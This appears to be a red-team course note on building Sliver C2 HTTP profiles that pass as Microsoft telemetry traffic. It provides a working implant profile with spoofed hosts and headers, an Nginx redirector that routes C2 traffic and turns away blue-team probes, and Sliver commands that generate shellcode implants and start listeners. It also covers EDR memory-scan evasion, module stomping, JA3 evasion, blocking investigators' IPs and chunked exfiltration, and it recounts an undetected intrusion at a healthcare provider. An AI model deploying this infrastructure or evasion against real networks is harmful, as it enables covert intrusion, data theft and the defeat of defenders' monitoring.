---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.11 Sliver C2 HTTP Profiles mimicking legitimate traffic"
---

# 95.11 Sliver C2 HTTP Profiles Mimicking Legitimate Traffic

## Introduction to HTTP/S C2 Profiles in Sliver
Sliver C2 is highly extensible and relies heavily on HTTP/S configurations to mimic legitimate network traffic. By manipulating HTTP headers, request URIs, query parameters, and response bodies, red teamers can successfully blend into the normal traffic patterns of a target environment. This document covers in extreme depth the configuration and deployment of HTTP/S Malleable C2 profiles within Sliver, allowing operators to bypass Deep Packet Inspection (DPI) and Next-Generation Firewalls (NGFW).

When using HTTP/S profiles, the implant beacons out over standardized web protocols. To the naked eye (and many automated defense systems), this communication should look indistinguishable from standard web browsing or routine API calls that a machine might make.

## Mechanics of HTTP/S Beacons

An HTTP/S beacon communicates in a structured, periodic manner. The cycle typically involves:
1. **Check-in (GET/POST Request):** The implant reaches out to the C2 server to announce it is alive and requests tasks.
2. **Tasking Response (200 OK + Payload):** The C2 server responds with encrypted shellcode, commands, or an empty response if there are no tasks.
3. **Execution & Exfiltration (POST Request):** The implant executes the task and POSTs the result back to the C2 server.

To mask these actions, we use HTTP profiles (often JSON formats in Sliver) that define exactly what these requests and responses look like.

## Advanced Configuration: Building a Custom JSON Profile

Sliver HTTP profiles define properties such as URIs, headers, and extensions used in the C2 communication. Below is a highly detailed, extended example of an HTTP profile designed to mimic a legitimate Microsoft telemetry API service.

```json
{
    "implant_config": {
        "format": "json",
        "obfuscate_symbols": true,
        "compile_time_randomization": true
    },
    "http_c2": {
        "endpoints": [
            "/api/v1/telemetry",
            "/v2.0/telemetry/device",
            "/v1/diagnostics/report",
            "/api/v3/metrics/upload"
        ],
        "headers": {
            "Host": "telemetry.microsoft.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0"
        },
        "response_headers": {
            "Server": "Microsoft-IIS/10.0",
            "X-Powered-By": "ASP.NET",
            "X-Content-Type-Options": "nosniff",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Content-Type": "application/json; charset=utf-8"
        },
        "query_parameters": {
            "device_id": "uuid",
            "session": "random_string",
            "version": "1.0.45"
        },
        "polling_interval": 30,
        "jitter": 15,
        "max_retry": 5,
        "retry_delay": 60
    }
}
```

### Explanation of Profile Directives
- **Endpoints:** Varying URIs prevent static signature detection. Using common telemetry paths helps mask the beaconing nature.
- **Headers:** Setting a realistic `User-Agent` and standard web headers (`Accept`, `Accept-Language`) ensures the requests don't look like an automated barebones Go HTTP client, which is the default for Sliver.
- **Response Headers:** Spoofing the `Server` header to `Microsoft-IIS/10.0` aligns with the Microsoft theme, providing consistency in the deceit.
- **Jitter and Polling:** Introducing a jitter of 15 seconds on a 30-second interval ensures the beaconing does not create a strictly periodic, easily detectable mathematical pattern in network logs.

## Reverse Proxy Deployment with NGINX

To protect the actual Sliver C2 server, it is highly recommended to place a redirector or reverse proxy in front of it. Nginx is the industry standard for this task. The redirector will accept traffic on the front-end, filter it, and only forward legitimate-looking C2 traffic to the backend Sliver server.

### Detailed Nginx Configuration

```nginx
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 1024;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    server_tokens off;

    # SSL Settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';

    server {
        listen 443 ssl http2;
        server_name telemetry-update.com;

        ssl_certificate /etc/letsencrypt/live/telemetry-update.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/telemetry-update.com/privkey.pem;

        # Legitimate traffic mimicry - redirect unwanted traffic
        location / {
            proxy_pass https://www.microsoft.com;
            proxy_set_header Host www.microsoft.com;
        }

        # Route C2 traffic to Sliver backend
        location ~ ^/(api/v1/telemetry|v2.0/telemetry/device|v1/diagnostics/report|api/v3/metrics/upload)$ {
            
            # Filtering based on User-Agent to prevent Blue Team probing
            if ($http_user_agent !~* "Edg/114.0.1823.58") {
                return 301 https://www.microsoft.com;
            }

            proxy_pass http://10.0.0.50:8080; # Backend Sliver Server
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Timeout configurations
            proxy_connect_timeout 90;
            proxy_send_timeout 90;
            proxy_read_timeout 90;
        }
    }
}
```

This configuration ensures that anyone browsing to `telemetry-update.com` directly without the correct URI and exact User-Agent is safely redirected to `microsoft.com`.

## ASCII Diagram: HTTP/S Traffic Flow

```text
    [ Target Environment ]                                  [ Attacker Infrastructure ]
    
    +-------------------+                                  +--------------------------+
    |                   |                                  |                          |
    | Compromised Host  |                                  |    NGINX Redirector      |
    | (Sliver Implant)  |                                  |    (telemetry-update.com)|
    |                   |                                  |                          |
    +--------+----------+                                  +-------------+------------+
             |                                                           |
             | 1. HTTP GET /api/v1/telemetry                             |
             |    User-Agent: Mozilla/5.0 ... Edg/114.0.1823.58          |
             +---------------------------------------------------------->|
                                                                         | 2. Proxy Pass to backend
                                                                         |    (if User-Agent & URI match)
                                                                         v
                                                          +--------------------------+
                                                          |                          |
                                                          |      Sliver C2 Server    |
                                                          |      (Internal Network)  |
                                                          |                          |
                                                          +-------------+------------+
             <----------------------------------------------------------+
             | 4. 200 OK + Encrypted Tasking Payload                     | 3. Sliver generates task
             |    Server: Microsoft-IIS/10.0                             |
    +--------+----------+
    |                   |
    | Decrypts Payload  |
    | Executes Command  |
    |                   |
    +--------+----------+
             |
             | 5. HTTP POST /v2.0/telemetry/device (Exfiltration)
             +----------------------------------------------------------> ...
```

## Real-World Attack Scenario

### Initial Foothold and Pivot
During an engagement targeting a mid-sized healthcare provider, an initial foothold was established via a spear-phishing payload that executed an initial dropper. The environment employed rigorous egress filtering, blocking outgoing SSH, FTP, and generic non-standard ports. 

### Deployment of Mimicry Profile
The Red Team deployed a Sliver implant compiled with an HTTP profile designed to mimic `health-telemetry.azure-api.net`. The Nginx reverse proxy was set up on a newly registered domain with a Let's Encrypt certificate. The proxy was configured to redirect all anomalous traffic to a benign Azure documentation page.

### Execution and Evasion
When the implant began beaconing, the traffic passed seamlessly through the Palo Alto NGFW because it categorized the traffic as legitimate HTTPS Microsoft Azure communication. The randomized jitter prevented the SIEM from flagging periodic, automated beaconing. For three weeks, the operators maintained persistent access, laterally moved via SMB Named Pipes (see [[13 - Sliver Pivot Listeners and Internal Routing]]), and achieved domain dominance without triggering any anomalous traffic alerts in the SOC.

## OPSEC Considerations
1. **Domain Reputation:** Always age your domains. A domain registered yesterday will often be blocked by web filters regardless of the traffic content.
2. **TLS Fingerprinting:** Be aware of JA3/JA3S fingerprints. Custom compiled implants might have different TLS handshakes than native Windows browsers. Advanced defenders look for mismatched user-agents and TLS fingerprints.
3. **Payload Size Limits:** When utilizing HTTP GET/POST, avoid excessively large responses. Break down large exfiltrations into smaller chunks to mimic standard JSON telemetry payloads. Large multi-megabyte POST requests to unknown endpoints will trigger alarms.

## Advanced Payload Delivery via HTTP
When configuring the HTTP listeners, you can also host payloads directly using the `profiles` command in Sliver.
```bash
# Generating an HTTP profile
sliver > profiles new --http telemetry-update.com --format shellcode --name azure_telemetry

# Generating the implant from the profile
sliver > profiles generate --name azure_telemetry --save /tmp/azure_implant.bin

# Starting the listener
sliver > http -L 10.0.0.50 -l 8080 --domain telemetry-update.com
```

## Chaining Opportunities
- **Lateral Movement:** Once initial access is gained via HTTP C2, operators can drop pivot implants that communicate internally over SMB, reducing the total amount of external HTTPS noise. See [[13 - Sliver Pivot Listeners and Internal Routing]].
- **Evasion with EDR Bypasses:** The HTTP implant can be wrapped in custom loaders to bypass static analysis. See [[14 - Bypassing EDRs with Sliver Custom Compiles]].

## Related Notes
- [[02 - Advanced Red Team Infrastructure Setup]]
- [[22 - Modifying C2 Profiles for Cobalt Strike and Sliver]]
- [[13 - Sliver Pivot Listeners and Internal Routing]]
- [[14 - Bypassing EDRs with Sliver Custom Compiles]]

## Extended Technical Reference and Advanced Troubleshooting

### Deep Dive into Infrastructure Resiliency
When conducting long-term, high-stakes engagements (such as APT simulations or extended Red Team operations), the resiliency of your Command and Control infrastructure is paramount. A single point of failure can lead to the loss of all deployed implants, potentially burning weeks of effort.

#### Redundant Redirectors
Always deploy multiple distinct redirectors pointing back to your team server. 
- **Primary Route:** Used for daily check-ins and high-jitter beaconing.
- **Secondary Route:** A fallback domain, perhaps using a completely different protocol (like DNS or Domain Fronting), that the implant attempts to contact only if the primary route fails for 48 consecutive hours.
- **Tertiary Route:** An extremely low-and-slow fallback, beaconing once a week via a compromised third-party service (e.g., Slack or Microsoft Graph API C2).

#### Automating Infrastructure Rollout
Use Terraform or Ansible to deploy your redirectors. If a Blue Team burns your IP, you should be able to spin up a new Nginx proxy, attach an elastic IP, and provision a new Let's Encrypt certificate in under 5 minutes.

### Advanced Evasion Techniques

#### Memory Scanning Evasion
Modern EDRs perform routine memory scans, looking for known signatures (like standard Sliver strings) sitting in `PAGE_EXECUTE_READWRITE` memory.
- **Sleep Obfuscation:** Advanced loaders implement techniques like `Ekko` or `FOLIAGE` to encrypt the implant's memory space while it is sleeping. The implant decrypts itself, executes its task, and re-encrypts itself before calling `Sleep()`.
- **Module Stomping:** Instead of allocating new memory, the loader hollows out a legitimate DLL loaded in the process space (e.g., `xpsprint.dll`) and injects the Sliver shellcode into that space. This bypasses heuristics looking for anomalous unbacked executable memory.

#### Network Signature Evasion
- **JA3/JA3S Fingerprinting:** The TLS handshake itself leaves a fingerprint. Sliver's default Go HTTP client has a specific JA3 hash. By compiling the implant to use the native Windows WinINET/WinHTTP APIs, the TLS handshake will exactly match the host OS's native traffic, neutralizing JA3-based detections.
- **Beacon Jitter:** A mathematically perfect 60-second beacon interval is easily detectable by simple statistical analysis (e.g., RITA or Zeek). Always configure a jitter of at least 25-30% to introduce randomness.

### Comprehensive Troubleshooting Checklist

1. **Firewall Configurations:**
   - Have you verified that port 443 is open on your team server?
   - Is the cloud provider's security group allowing inbound UDP/53 (for DNS) and TCP/443 (for HTTPS)?
   - Are internal host firewalls (Windows Defender Firewall) blocking the named pipe or TCP bind port?

2. **Certificate Validation:**
   - If using mTLS, check that the client config hasn't expired.
   - For HTTPS C2, ensure the Let's Encrypt certificate is correctly mounted in the Nginx reverse proxy.
   - Check if the target environment employs SSL/TLS inspection. If so, your custom cert might be replaced by the corporate proxy, breaking pinning.

3. **Implant Execution Issues:**
   - Did the shellcode runner allocate memory with `PAGE_EXECUTE_READWRITE`? (Consider `PAGE_READWRITE` followed by `VirtualProtect` to `PAGE_EXECUTE_READ`).
   - Is the process architecture matching the implant? (Don't inject x64 shellcode into a SysWOW64 process).
   - Are dependencies missing on the target? (Go binaries are usually statically linked, but custom loaders might require certain MSVC runtimes if not compiled correctly).

### Logging and Telemetry

To ensure proper OPSEC, Red Teams must monitor their own infrastructure for Blue Team probing.

**Nginx Access Logs (Red Team Monitoring):**
```bash
tail -f /var/log/nginx/access.log | grep -v "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"
```
*This command filters out your expected C2 traffic, allowing you to instantly see if a threat hunter is curling your endpoint with a default curl User-Agent. If you see anomalous probing, dynamically update Nginx to block the investigator's IP.*

**Sliver Server Logs:**
Enable debug logging on the Sliver team server if implants are failing to check-in:
```bash
Sliver Server > debug --enable
```
Examine the `~/.sliver/logs/sliver.log` file. Look for TLS handshake errors, which indicate either a proxy interception or a mismatched profile.

### Recommended Tooling Integration
- **Cobalt Strike:** While Sliver is powerful, it is often used as a fallback C2. You can use Sliver to drop a Cobalt Strike Beacon if the environment is determined to be safe.
- **BloodHound:** Always pipe your active sessions through a BloodHound ingestor (like SharpHound) to maintain an up-to-date map of lateral movement paths.
- **Sysmon:** In your lab environment, install Sysmon with SwiftOnSecurity's config to see exactly what your Sliver implants look like to defenders.

### Artifact Cleanup

Upon completion of the engagement, ensure all artifacts are safely removed to prevent leaving the client vulnerable.
1. Terminate all active sessions from the Sliver console.
2. If custom services or registry keys were created for persistence, issue commands to delete them before terminating the session.
3. Shred the implant binaries on disk using `sdelete` or equivalent.
4. Revoke the SSL certificates and decommission the Nginx redirectors to prevent domain takeover or misuse by actual threat actors.

### Final Thoughts on Malleability
The true power of any C2 framework lies not in its built-in features, but in its malleability. The ability to look like something you are not—be it a Microsoft API, a DNS query, or an internal backup process—is the essence of modern red teaming. Keep your profiles updated, rotate your domains, and always assume the blue team is watching.

---
*End of Note.*
